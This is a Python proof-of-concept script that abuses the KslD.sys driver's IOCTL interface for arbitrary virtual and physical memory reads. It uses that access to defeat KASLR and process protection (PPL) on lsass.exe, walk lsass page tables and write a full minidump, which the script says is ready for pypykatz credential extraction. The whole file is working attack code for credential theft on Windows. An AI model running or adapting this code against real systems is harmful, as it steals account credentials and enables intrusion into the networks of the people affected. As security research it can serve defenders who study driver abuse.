"""
PoC: KslD.sys SubCmd 7 - lsass minidump via physical memory (PPL bypass)

Produces a single .dmp file in Windows Minidump format that pypykatz can parse:
  pypykatz lsa minidump lsass.dmp

The minidump contains:
  - SystemInfoStream (OS version, architecture)
  - ModuleListStream (all loaded DLLs with names)
  - Memory64ListStream (full virtual address space data)
"""
import ctypes
import ctypes.wintypes
import struct
import sys
import os
import time
import winreg

sys.stdout.reconfigure(encoding='utf-8')

kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
kernel32.CreateFileW.restype = ctypes.c_void_p
INVALID_HANDLE = ctypes.c_void_p(-1).value
IOCTL_KSLD = 0x222044
PFN_MASK = 0xFFFFFFFFF000

# ── I/O ─────────────────────────────────────────────────────────

def ioctl(h, inbuf, outsize=0x1000):
    outbuf = ctypes.create_string_buffer(outsize)
    ret = ctypes.wintypes.DWORD(0)
    ok = kernel32.DeviceIoControl(
        ctypes.wintypes.HANDLE(h), IOCTL_KSLD,
        inbuf, len(inbuf), outbuf, outsize, ctypes.byref(ret), None)
    return outbuf.raw[:ret.value] if ok and ret.value > 0 else None

def resolve_symbol(h, name):
    nb = (name + "\x00").encode('utf-16-le')
    r = ioctl(h, struct.pack('<III', 7, len(nb), 0xc) + nb, 16)
    return struct.unpack('<Q', r[:8])[0] if r and len(r) >= 8 else None

def virt_read(h, addr, size):
    return ioctl(h, struct.pack('<IIQQII', 12, 0, addr, size, 2, 0), max(size+256, 4096))

def phys_read(h, addr, size):
    return ioctl(h, struct.pack('<IIQQII', 12, 0, addr, size, 1, 0), max(size+256, 4096))

def rp(d, o): return struct.unpack_from('<Q', d, o)[0]
def rd(d, o): return struct.unpack_from('<I', d, o)[0]
def rw(d, o): return struct.unpack_from('<H', d, o)[0]

# ── Page table walk ─────────────────────────────────────────────

def vtp(h, dtb, va):
    db = dtb & PFN_MASK
    for shift in (39, 30, 21):
        d = phys_read(h, db + ((va >> shift) & 0x1FF) * 8, 8)
        if not d: return None
        e = struct.unpack('<Q', d[:8])[0]
        if not (e & 1): return None
        if (e & 0x80) and shift < 39:
            mask = (1 << shift) - 1
            return (e & PFN_MASK & ~mask) | (va & mask)
        db = e & PFN_MASK
    d = phys_read(h, db + ((va >> 12) & 0x1FF) * 8, 8)
    if not d: return None
    e = struct.unpack('<Q', d[:8])[0]
    if e & 1: return (e & PFN_MASK) | (va & 0xFFF)
    if e & 0x800: return (e & PFN_MASK) | (va & 0xFFF)
    return None

def proc_read(h, dtb, va, size):
    result = b''
    off = 0
    while off < size:
        pg = (va + off) & 0xFFF
        chunk = min(size - off, 0x1000 - pg)
        try: pa = vtp(h, dtb, va + off)
        except: pa = None
        if pa:
            d = phys_read(h, pa, chunk)
            result += d[:chunk] if d and len(d) >= chunk else b'\x00' * chunk
        else:
            result += b'\x00' * chunk
        off += chunk
    return result

# ── Minidump format constants ───────────────────────────────────

MINIDUMP_SIGNATURE = 0x504D444D  # 'MDMP'
MINIDUMP_VERSION = 0x0000A793
# Stream types
SystemInfoStream = 7
ModuleListStream = 4
Memory64ListStream = 9

# ── Minidump writer ─────────────────────────────────────────────

def write_minidump_string(f, s):
    """Write MINIDUMP_STRING: ULONG Length (bytes, no null) + WCHAR[] (with null)"""
    encoded = s.encode('utf-16-le')
    rva = f.tell()
    f.write(struct.pack('<I', len(encoded)))  # byte length (not including null)
    f.write(encoded)
    f.write(b'\x00\x00')  # null terminator
    return rva

def build_minidump(out_path, build, modules, memory_ranges, memory_data):
    """
    modules: list of (base, size, name_str, timestamp, checksum)
    memory_ranges: list of (start_va, size)
    memory_data: concatenated bytes for all ranges (in order)
    """
    with open(out_path, 'wb') as f:
        num_streams = 3  # SystemInfo + ModuleList + Memory64List

        # ── Header (32 bytes) ───────────────────────────────────
        header_pos = 0
        f.write(struct.pack('<I', MINIDUMP_SIGNATURE))     # Signature
        f.write(struct.pack('<I', MINIDUMP_VERSION))        # Version
        f.write(struct.pack('<I', num_streams))             # NumberOfStreams
        stream_dir_rva_pos = f.tell()
        f.write(struct.pack('<I', 0))                       # StreamDirectoryRva (patch later)
        f.write(struct.pack('<I', 0))                       # CheckSum
        f.write(struct.pack('<I', int(time.time())))        # TimeDateStamp
        f.write(struct.pack('<Q', 0x00000002))              # Flags = MiniDumpWithFullMemory

        # ── Stream Directory (12 bytes each) ────────────────────
        stream_dir_rva = f.tell()
        # Patch header
        pos = f.tell()
        f.seek(stream_dir_rva_pos)
        f.write(struct.pack('<I', stream_dir_rva))
        f.seek(pos)

        # Placeholders for 3 directory entries
        dir_entries_pos = f.tell()
        for _ in range(num_streams):
            f.write(b'\x00' * 12)  # StreamType(4) + DataSize(4) + Rva(4)

        # ── SystemInfoStream ────────────────────────────────────
        sysinfo_rva = f.tell()
        # MINIDUMP_SYSTEM_INFO (simplified, 56 bytes)
        f.write(struct.pack('<H', 9))          # ProcessorArchitecture = AMD64
        f.write(struct.pack('<H', 6))          # ProcessorLevel (family 6)
        f.write(struct.pack('<H', 0))          # ProcessorRevision
        f.write(struct.pack('<B', os.cpu_count() or 1))  # NumberOfProcessors
        f.write(struct.pack('<B', 1))          # ProductType = VER_NT_WORKSTATION
        f.write(struct.pack('<I', 10))         # MajorVersion
        f.write(struct.pack('<I', 0))          # MinorVersion
        f.write(struct.pack('<I', build))      # BuildNumber
        f.write(struct.pack('<I', 2))          # PlatformId = VER_PLATFORM_WIN32_NT
        f.write(struct.pack('<I', 0))          # CSDVersionRva (no service pack)
        f.write(struct.pack('<H', 0))          # SuiteMask
        f.write(struct.pack('<H', 0))          # Reserved2
        # ProcessorFeatures (AMD64 - CONTEXT structure size etc.)
        # CPU_INFORMATION union (24 bytes for x86/x64)
        f.write(b'\x00' * 24)
        sysinfo_size = f.tell() - sysinfo_rva

        # ── ModuleListStream ────────────────────────────────────
        # First write all module name strings and record their RVAs
        name_rvas = []
        for base, size, name, ts, checksum in modules:
            name_rvas.append(write_minidump_string(f, name))

        modlist_rva = f.tell()
        f.write(struct.pack('<I', len(modules)))  # NumberOfModules

        for i, (base, size, name, ts, checksum) in enumerate(modules):
            # MINIDUMP_MODULE (108 bytes)
            f.write(struct.pack('<Q', base))      # BaseOfImage
            f.write(struct.pack('<I', size))       # SizeOfImage
            f.write(struct.pack('<I', checksum))   # CheckSum
            f.write(struct.pack('<I', ts))         # TimeDateStamp
            f.write(struct.pack('<I', name_rvas[i]))  # ModuleNameRva
            # VS_FIXEDFILEINFO (52 bytes) - zeros
            f.write(b'\x00' * 52)
            # CvRecord: MINIDUMP_LOCATION_DESCRIPTOR (DataSize=0, Rva=0)
            f.write(struct.pack('<II', 0, 0))
            # MiscRecord: MINIDUMP_LOCATION_DESCRIPTOR (DataSize=0, Rva=0)
            f.write(struct.pack('<II', 0, 0))
            # Reserved0, Reserved1
            f.write(struct.pack('<QQ', 0, 0))
        modlist_size = f.tell() - modlist_rva

        # ── Memory64ListStream ──────────────────────────────────
        mem64_rva = f.tell()
        f.write(struct.pack('<Q', len(memory_ranges)))  # NumberOfMemoryRanges
        # BaseRva: file offset where actual memory data starts
        base_rva_pos = f.tell()
        f.write(struct.pack('<Q', 0))  # placeholder

        for start_va, sz in memory_ranges:
            f.write(struct.pack('<QQ', start_va, sz))

        mem64_size = f.tell() - mem64_rva

        # ── Memory data ─────────────────────────────────────────
        mem_data_rva = f.tell()
        # Patch BaseRva
        cur = f.tell()
        f.seek(base_rva_pos)
        f.write(struct.pack('<Q', mem_data_rva))
        f.seek(cur)
        # Write all memory data
        f.write(memory_data)

        # ── Patch stream directory ──────────────────────────────
        f.seek(dir_entries_pos)
        # Entry 0: SystemInfoStream
        f.write(struct.pack('<III', SystemInfoStream, sysinfo_size, sysinfo_rva))
        # Entry 1: ModuleListStream
        f.write(struct.pack('<III', ModuleListStream, modlist_size, modlist_rva))
        # Entry 2: Memory64ListStream
        f.write(struct.pack('<III', Memory64ListStream, mem64_size, mem64_rva))

    return os.path.getsize(out_path)


# ── Main ────────────────────────────────────────────────────────

def main():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("[-] Run as Administrator"); return 1

    build = int(winreg.QueryValueEx(
        winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                       r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"),
        "CurrentBuildNumber")[0])

    out_path = os.path.join(os.environ.get('USERPROFILE', '.'), 'lsass.dmp')

    print("=" * 64)
    print("  SubCmd 7 - lsass Minidump Generator")
    print(f"  Build {build}, Output: {out_path}")
    print("=" * 64)

    h = kernel32.CreateFileW("\\\\.\\KslD", 0xC0000000, 7, None, 3, 0, None)
    if h == INVALID_HANDLE:
        raise RuntimeError(f"CreateFile failed: {ctypes.get_last_error()}")
    print(f"\n[+] Device opened")

    try:
        # Step 1: SubCmd 7
        print("\n[*] Step 1: KASLR bypass via SubCmd 7")
        psip = resolve_symbol(h, "PsInitialSystemProcess")
        if not psip: raise RuntimeError("SubCmd 7 failed")
        print(f"    PsInitialSystemProcess = 0x{psip:016x}")

        # Step 2: Find lsass
        print("\n[*] Step 2: Finding lsass.exe")
        sys_ep = rp(virt_read(h, psip, 8), 0)
        ep_data = virt_read(h, sys_ep, 0x800)

        off_pid = off_links = off_name = 0
        for off in range(0x100, 0x600, 8):
            if struct.unpack_from('<Q', ep_data, off)[0] == 4:
                nxt = struct.unpack_from('<Q', ep_data, off + 8)[0]
                if nxt > 0xFFFF000000000000:
                    off_pid, off_links = off, off + 8; break
        for off in range(0x200, 0x700):
            if ep_data[off:off+7] == b'System\x00':
                off_name = off; break

        head = sys_ep + off_links
        cur = rp(virt_read(h, head, 8), 0)
        seen = {head}
        lsass_ep = lsass_dtb = lsass_peb_off = 0

        for _ in range(500):
            if cur in seen or not cur: break
            seen.add(cur)
            ep = cur - off_links
            nm = virt_read(h, ep + off_name, 15)
            if nm and nm.split(b'\x00')[0].lower() == b'lsass.exe':
                lsass_dtb = rp(virt_read(h, ep + 0x28, 8), 0)
                lsass_pid = rp(virt_read(h, ep + off_pid, 8), 0)
                lsass_ep = ep
                ep2 = virt_read(h, ep, 0x800)
                for poff in range(0x100, 0x600, 8):
                    val = struct.unpack_from('<Q', ep2, poff)[0]
                    if 0x10000 < val < 0x7FFFFFFFFFFF:
                        peb = proc_read(h, lsass_dtb, val, 0x20)
                        if peb != b'\x00' * 0x20:
                            ldr, img = rp(peb, 0x18), rp(peb, 0x10)
                            if 0x10000 < ldr < 0x7FFFFFFFFFFF and 0x10000 < img < 0x7FFFFFFFFFFF:
                                lsass_peb_off = poff; break
                break
            cur = rp(virt_read(h, cur, 8), 0)

        if not lsass_ep: raise RuntimeError("lsass.exe not found")
        print(f"    lsass.exe PID={lsass_pid} DTB=0x{lsass_dtb:x}")

        # Step 3: Enumerate modules
        print("\n[*] Step 3: Enumerating loaded modules")
        peb_va = rp(virt_read(h, lsass_ep + lsass_peb_off, 8), 0)
        peb_data = proc_read(h, lsass_dtb, peb_va, 0x20)
        ldr_va = rp(peb_data, 0x18)
        ldr_head = ldr_va + 0x20
        ldr_cur = rp(proc_read(h, lsass_dtb, ldr_head, 8), 0)
        ldr_seen = {ldr_head}

        modules = []  # (base, size, full_path, timestamp, checksum)

        while ldr_cur and ldr_cur not in ldr_seen:
            ldr_seen.add(ldr_cur)
            entry = proc_read(h, lsass_dtb, ldr_cur - 0x10, 0x80)
            if entry == b'\x00' * 0x80: break

            dll_base = rp(entry, 0x30)
            dll_size = rd(entry, 0x40)
            name_len = rw(entry, 0x48)
            name_ptr = rp(entry, 0x50)

            mod_name = ""
            if name_len and name_ptr and name_len < 512:
                raw = proc_read(h, lsass_dtb, name_ptr, min(name_len, 512))
                try: mod_name = raw.decode('utf-16-le')
                except: mod_name = f"unknown_{dll_base:x}"

            if dll_base and dll_size:
                # Read PE timestamp and checksum from memory
                pe_hdr = proc_read(h, lsass_dtb, dll_base, 0x200)
                ts = checksum = 0
                if pe_hdr[:2] == b'MZ':
                    pe_off = rd(pe_hdr, 0x3c)
                    if pe_off + 0x58 < len(pe_hdr) and pe_hdr[pe_off:pe_off+4] == b'PE\x00\x00':
                        ts = rd(pe_hdr, pe_off + 8)
                        checksum = rd(pe_hdr, pe_off + 0x58)

                modules.append((dll_base, dll_size, mod_name, ts, checksum))
                print(f"    0x{dll_base:016x}  0x{dll_size:08x}  {os.path.basename(mod_name)}")

            ldr_cur = rp(entry, 0x10)

        print(f"    Total: {len(modules)} modules")

        # Step 4: Scan page tables to find ALL valid lsass user-space pages
        # This is critical - pypykatz needs heap regions (not just module images)
        # because LSA keys and credential structures live on the heap.
        print(f"\n[*] Step 4: Scanning lsass page tables for all user-space pages...")

        valid_pages = []  # list of valid VA (page-aligned)
        dtb_base = lsass_dtb & PFN_MASK
        t0_scan = time.time()

        # Scan PML4 entries 0-255 (user space, lower half)
        for pml4_idx in range(256):
            pml4e_data = phys_read(h, dtb_base + pml4_idx * 8, 8)
            if not pml4e_data: continue
            pml4e = struct.unpack('<Q', pml4e_data[:8])[0]
            if not (pml4e & 1): continue

            pdpt_base = pml4e & PFN_MASK
            for pdpt_idx in range(512):
                pdpte_data = phys_read(h, pdpt_base + pdpt_idx * 8, 8)
                if not pdpte_data: continue
                pdpte = struct.unpack('<Q', pdpte_data[:8])[0]
                if not (pdpte & 1): continue

                if pdpte & 0x80:  # 1GB large page
                    va = (pml4_idx << 39) | (pdpt_idx << 30)
                    for pg in range(0, 1 << 30, 0x1000):
                        valid_pages.append(va + pg)
                    continue

                pd_base = pdpte & PFN_MASK
                for pd_idx in range(512):
                    pde_data = phys_read(h, pd_base + pd_idx * 8, 8)
                    if not pde_data: continue
                    pde = struct.unpack('<Q', pde_data[:8])[0]
                    if not (pde & 1): continue

                    if pde & 0x80:  # 2MB large page
                        va = (pml4_idx << 39) | (pdpt_idx << 30) | (pd_idx << 21)
                        for pg in range(0, 1 << 21, 0x1000):
                            valid_pages.append(va + pg)
                        continue

                    pt_base = pde & PFN_MASK
                    # Read entire PT (4KB = 512 entries) in one call for speed
                    pt_data = phys_read(h, pt_base, 4096)
                    if not pt_data: continue

                    for pt_idx in range(512):
                        pte = struct.unpack_from('<Q', pt_data, pt_idx * 8)[0]
                        if pte & 1 or pte & 0x800:  # present or transition
                            va = (pml4_idx << 39) | (pdpt_idx << 30) | (pd_idx << 21) | (pt_idx << 12)
                            valid_pages.append(va)

        scan_elapsed = time.time() - t0_scan
        print(f"    Found {len(valid_pages)} valid pages ({len(valid_pages)*4096/1024/1024:.1f} MB) in {scan_elapsed:.1f}s")

        # Merge contiguous pages into ranges for Memory64List
        valid_pages.sort()
        memory_ranges = []
        if valid_pages:
            range_start = valid_pages[0]
            range_end = valid_pages[0] + 0x1000
            for va in valid_pages[1:]:
                if va == range_end:
                    range_end = va + 0x1000
                else:
                    memory_ranges.append((range_start, range_end - range_start))
                    range_start = va
                    range_end = va + 0x1000
            memory_ranges.append((range_start, range_end - range_start))

        print(f"    Merged into {len(memory_ranges)} contiguous ranges")

        # Read all pages
        print(f"\n[*] Step 5: Reading {len(valid_pages)} pages from lsass physical memory...")
        all_data = bytearray()
        pages_read = 0
        t0_read = time.time()

        for range_start, range_size in memory_ranges:
            data = proc_read(h, lsass_dtb, range_start, range_size)
            all_data.extend(data)
            pages_read += range_size // 0x1000
            if pages_read % 1000 == 0:
                print(f"    {pages_read}/{len(valid_pages)} pages...", flush=True)

        read_elapsed = time.time() - t0_read
        print(f"    Read {pages_read} pages ({len(all_data)/1024/1024:.1f} MB) in {read_elapsed:.1f}s")

        # Step 6: Write minidump
        print(f"\n[*] Step 6: Writing minidump to {out_path}")
        file_size = build_minidump(out_path, build, modules, memory_ranges, bytes(all_data))
        print(f"    Size: {file_size:,} bytes ({file_size/1024/1024:.1f} MB)")

        print(f"\n{'=' * 64}")
        print(f"  Minidump written: {out_path}")
        print(f"  Verify with: pypykatz lsa minidump {out_path}")
        print(f"{'=' * 64}")
        return 0

    finally:
        kernel32.CloseHandle(ctypes.wintypes.HANDLE(h))

if __name__ == '__main__':
    try: sys.exit(main())
    except Exception as e:
        print(f"\n[-] FATAL: {e}")
        import traceback; traceback.print_exc()
        sys.exit(1)
